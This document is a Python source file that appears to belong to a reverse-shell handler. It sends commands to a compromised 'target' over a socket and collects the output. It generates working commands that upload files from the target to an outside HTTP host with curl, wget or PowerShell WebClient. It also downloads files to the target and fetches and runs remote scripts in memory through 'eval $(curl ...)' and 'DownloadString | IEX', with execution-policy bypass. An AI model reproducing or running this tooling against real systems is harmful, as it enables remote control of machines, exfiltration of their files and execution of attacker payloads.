import re
import time
import base64
from shell_utils.shell_factory import Shells
from utils.print_utils import Printer
from utils.pwsh_utils import ObfUtil
from queue import Queue, Empty
from enum import Enum, auto
from os.path import isfile, basename, join

class FileMode(Enum):
    Append = auto()
    Create = auto()

class SessionExec(object):
    """
    SessionExec is the class allowing us to execute command on the target and recover the result
    The result will be stored in our waiting queue
    """
    def __init__(self, con):
        self.socket = con
        self.answer_queue = Queue()
        self.maker = CmdMaker(" ")
        self.is_waiting = False

    def exec(
            self,
            cmd,
            timeout=5,
            get_all=True,
            hide_error=False,
            shell_type=None
        ):
        """
        Exec a command and return the string result stripped
        When get_all is True this function try to recover the whole result through delimiters
        
        Example:
        ```sh
        $ echo "=====" ; whoami ; echo "====="
        =====
        kali
        =====
        ```

        """

        self.is_waiting = True

        res = ""
        full_res = None

        self.maker.init_command(cmd)
        if(shell_type is not None):
            self.maker.with_shell_type(shell_type)

        if(hide_error):
            self.maker.hide_error()

        if(get_all):
            self.maker.surround()

        cmd = self.maker.end().get_command()

        Printer.dbg(f"Running {cmd}")
        self.socket.send(cmd)
        try:
            if not(get_all):
                res = self.answer_queue.get(timeout=timeout)

            else:
                while True:
                    res += self.answer_queue.get(timeout=timeout)
                    Printer.dbg(f"Queued answer: {res}")
                    pos = res.rfind(CmdMaker.Delimiter)
                    if pos != -1:
                        res_to_extract = res[pos + len(CmdMaker.Delimiter):]
                    else:
                        res_to_extract = res

                    if re.match(CmdMaker.PatternForResult, res_to_extract):
                        full_res = res.split("=====")[-2].lstrip(';')
                        if not(self.maker.command_origin.strip() in full_res.strip()):
                            break

                        else:
                            res = ""

        except Empty:
            pass

        finally:
            self.is_waiting = False

        if(get_all and full_res):
            return full_res.strip()

        return res.strip()

    def exec_no_result(self, cmd):
        cmd = self.maker.init_command(cmd).end().get_command()
        Printer.dbg(f"Running {cmd}")
        self.socket.send(cmd)

    def exec_all_no_result(self, list_cmd, wait=0):
        for c in list_cmd:
            self.exec_no_result(c)
            if wait != 0:
                time.sleep(wait)

    def write_chunk_to_file(self, file, chunk, shell_type, mode):
        if(type(chunk) == str):
            chunk = chunk.encode()
        chunk_encoded = base64.b64encode(chunk)
        cmd = self.maker.init_command(chunk_encoded).with_shell_type(shell_type).decode_b64_command().redirect_output_to_file(file, mode).end().get_command()
        self.exec_no_result(cmd)
        time.sleep(0.1)

    def upload(self, file, where, shell_type):
        if not isfile(file):
            Printer.err(f"File {file} does not exists")

        else:
            chunk_size = 512
            content = []
            with open(file, 'rb') as f:
                while True:
                    data = f.read(chunk_size)
                    if(not(data)):
                        break
                    content.append(data)

            for i in range(len(content)):
                mode = FileMode.Create if(i == 0) else FileMode.Append
                Printer.log(f"Uploading chunk {i} on {len(content)}  ", end="\r")
                self.write_chunk_to_file(where, content[i], shell_type, mode)

            Printer.log("Done")

    def upload_http(self, http_link, where, shell_type, available_bin):
        cmd = self.maker.with_shell_type(shell_type).download_from(http_link, where, available_bin).end().get_command()
        self.exec_no_result(cmd)

    def download(self, http_link, file, shell_type, available_bin):
        cmd = self.maker.with_shell_type(shell_type).upload_file(http_link, file, available_bin).end().get_command()
        self.exec_no_result(cmd)

    def load(self, http_link, shell_type, available_bin):
        cmd = self.maker.with_shell_type(shell_type).load_script(http_link, available_bin).end().get_command()
        self.exec_no_result(cmd)

    def download_hex(self, file, shell_type):
        cmd = self.maker.to_hex().get_command()
        file_content = self.exec(cmd, timeout=2, shell_type=shell_type)
        return file_content

    def download_base64(self, file, shell_type):
        cmd = self.maker.to_b64().get_command()
        file_content = self.exec(cmd, timeout=2, shell_type=shell_type)
        return file_content

class CmdMaker:
    """
    Class responsible for parsing and establishing the command
    The command must be str each time, but at the end it will be bytes
    """

    Delimiter = "echo \"=====\""
    PatternForResult = re.compile(r'.*=====(.*?)=====', re.DOTALL)

    def __init__(self, cmd="", shell_type=Shells.Basic):
        self._command_origin = cmd
        self._cmd = cmd
        self.shell_type = shell_type

    @property
    def command_origin(self):
        if(type(self._command_origin) == bytes):
            return self._command_origin.decode('utf-8', 'ignore')
        return self._command_origin

    def command_to_byte(self):
        if(type(self._cmd) == str):
            self._cmd = self._cmd.encode()
        return self

    def command_to_string(self):
        if(type(self._cmd) == bytes):
            self._cmd = self._cmd.decode("utf-8", "ignore")
        return self

    def init_command(self, command):
        self._command_origin = command
        self._cmd = command
        self.command_to_string()
        return self

    def surround(self):
        """This function surround the command with delimiter to help finding the result"""
        join = CmdUtils.get_joiner_for_command(self.shell_type)
        self._cmd = CmdUtils.isolate_command(self._cmd, self.shell_type)
        self._cmd = f"{CmdMaker.Delimiter} {join} {self._cmd} {join} {CmdMaker.Delimiter}"
        return self

    def show_error(self):
        self._cmd = f"{self._cmd} 2>&1"
        return self

    def hide_error(self):
        self._cmd = CmdUtils.get_error_catcher(self._cmd, self.shell_type)
        return self

    def crlf(self):
        self._cmd += "\n"
        return self

    def decode_b64_command(self):
        self._cmd = CmdUtils.get_b64_decode_command(self._cmd, self.shell_type)
        return self

    def redirect_output_to_file(self, file, mode):
        self._cmd = CmdUtils.output_to_file(file, self._cmd, mode, self.shell_type)
        return self

    def with_shell_type(self, shell):
        self.shell_type = shell
        return self

    def end(self, with_crlf=True):
        if(with_crlf):
            self.crlf()
        self.command_to_byte()
        return self

    def get_command(self):
        return self._cmd

    def to_b64(self):
        self._cmd = CmdUtils.file_to_base64(self._cmd, self.shell_type)
        return self

    def to_hex(self):
        self._cmd = CmdUtils.file_to_hex(self._cmd, self.shell_type)
        return self

    def download_from(self, http_link, where, available_bin):
        """
        Download the file named "file" from the link "http_link"
        """
        if(CmdUtils.is_download_available(self.shell_type, available_bin)):
            self._cmd = CmdUtils.get_command_for_download(self.shell_type, http_link, where, available_bin)
        else:
            raise Exception("Cannot download via http, use file write")

        return self

    def upload_file(self, http_link, file, available_bin):
        """Upload a file to http_link which is a minishh url"""
        self._cmd = CmdUtils.get_command_for_upload(self.shell_type, http_link, file, available_bin)
        return self

    def load_script(self, http_link, available_bin):
        """Load a script in the current process memory"""
        self._cmd = CmdUtils.get_command_for_load(self.shell_type, http_link, available_bin)
        return self

class CmdUtils:
    """
    CmdUtils is a class that has knowledge about differences between command, in function of the OS (shell used) 
    """
    @staticmethod
    def get_joiner_for_command(shell_type):
        if shell_type & Shells.Windows:
            return "&"
        return ";"

    @staticmethod
    def isolate_command(cmd, shell_type):
        if shell_type & Shells.Powershell:
            return cmd
        return f'({cmd})'

    @staticmethod
    def get_error_catcher(command, shell_type):
        if shell_type & Shells.Windows:
            return f'({command}) 2> nul'
        elif shell_type & Shells.Powershell:
            return 'try{ ' + command + ' }catch{}'
        return f'({command}) 2>/dev/null'

    @staticmethod
    def get_b64_decode_command(command, shell_type):
        if shell_type & Shells.Powershell:
            return f'[System.Convert]::FromBase64String("{command}")'

        elif shell_type & Shells.Windows:
            return f'powershell -ep bypass -c "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\\"{command}\\"))"'

        else:
            return f"echo \"{command}\" | base64 -d"


    @staticmethod
    def output_to_file(filename, command, mode, shell_type):
        if shell_type & Shells.Powershell:
            output = f"[IO.File]::WriteAllBytes(\"{filename}\", "
            if mode == FileMode.Append:
                output += f"[IO.File]::ReadAllBytes(\"{filename}\") + "
            output += f"{command})"
            return output

        else:
            if mode == FileMode.Append:
                output = f"({command}) >> {filename}"
            else:
                output = f"({command}) > {filename}"
            return output

    @staticmethod
    def get_command_for_upload(shell_type, http_link, file, available_bin):
        if shell_type & Shells.Powershell:
            return f'(New-Object System.Net.WebClient).UploadFile("{http_link}", "{file}")'

        elif shell_type & Shells.Windows:
            return f'powershell -ep bypass -c "(New-Object System.Net.WebClient).UploadFile(\\"{http_link}\\", \\"{file}\\");"'

        if "curl" in available_bin:
            return f"curl -s -F 'minishh_dl=@{file}' '{http_link}'"
        
        elif "wget" in available_bin:
            return f"wget -O - --post-file '{file}' '{http_link}'"

        else:
            raise Exception("No binaries found for download")

    @staticmethod
    def get_command_for_download(shell_type, http_link, where, available_bin):
        if shell_type & Shells.Powershell:
            return f'(new-object system.net.webclient).downloadfile("{http_link}", "{where}")'

        elif shell_type & Shells.Windows:
            if("curl" in available_bin):
                return f'curl -s "{http_link}" -o "{where}"'
            return f'powershell -ep bypass -c "(new-object system.net.webclient).downloadfile(\\"{http_link}\\", \\"{where}\\");"'

        else:
            if "wget" in available_bin:
                return f"wget '{http_link}' -O {where}"

            elif "curl" in available_bin:
                return f"curl '{http_link}' -o {where}"

            else:
                raise Exception("No binaries found for download, despite the download")

    @staticmethod
    def get_command_for_load(shell_type, http_link, available_bin):
        """
        Return the command to load a script in memory
        Example in bash:
        ```bash
        $ echo 'alias os="uname -a"' > alias.sh && python3 -m http.server 8080 &
        $ os
        os: command not found
        
        $ eval $(curl "http://127.0.0.1:8080/alias.sh") && kill %1
        $ os
        Linux kali ... GNU/Linux
        ```

        ```python3
        > CmdUtils.get_command_for_load(Shells.Basic, 'http://127.0.0.1:9001/dnjkznker.log')
        eval $(curl -s "http://127.0.0.1:9001/dnjkznker.log")
        > ^D
        ```
        """
        if shell_type & Shells.Powershell:
            return f'(New-Object System.Net.WebClient).DownloadString("{http_link}") | IEX'

        elif shell_type & Shells.Basic:
            if "curl" in available_bin:
                return f'eval $(curl -s "{http_link}")'

            elif "wget" in available_bin:
                return f'eval $(wget -q -O - "{http_link}")'

            else:
                raise Exception("No binaries found for download")

        raise NotImplementedError("Load function cannot be used for the shell type you currently have")

    @staticmethod
    def file_to_base64(filename, shell_type):
        if shell_type & Shells.Basic:
            return f"[ -f \"{filename}\" ] && base64 {filename} -w 0 && echo "
        elif shell_type & Shells.Powershell:
            return f'if(Test-Path "{filename}"){{$bytes = [System.IO.File]::ReadAllBytes("{filename}");[System.Convert]::ToBase64String($bytes)}}'
        elif shell_type & Shells.Windows:
            return f'powershell -ep bypass -c "if(Test-Path \\"{filename}\\"){{$bytes = [System.IO.File]::ReadAllBytes(\'{filename}\');[System.Convert]::ToBase64String($bytes)}}"'
        return None

    @staticmethod
    def file_to_hex(filename, shell_type):
        if shell_type & Shells.Basic:
            return f"[ -f \"{filename}\" ] && xxd -p {filename}"
        elif shell_type & Shells.Powershell:
            return f'if(Test-Path "{filename}"){{$bytes = [System.IO.File]::ReadAllBytes("{filename}");[System.BitConverter]::ToString($bytes).Replace("-","")}}'
        elif shell_type & Shells.Windows:
            return f'powershell -ep bypass -c "if(Test-Path \\"{filename}\\"){{$bytes = [System.IO.File]::ReadAllBytes(\'{filename}\');[System.BitConverter]::ToString($bytes).Replace(\'-\',\'\')}}"'
        return None

    @staticmethod
    def is_download_available(shell_type, available_bin):
        if shell_type & Shells.Basic:
            return ("wget" in available_bin or "curl" in available_bin)
        return True
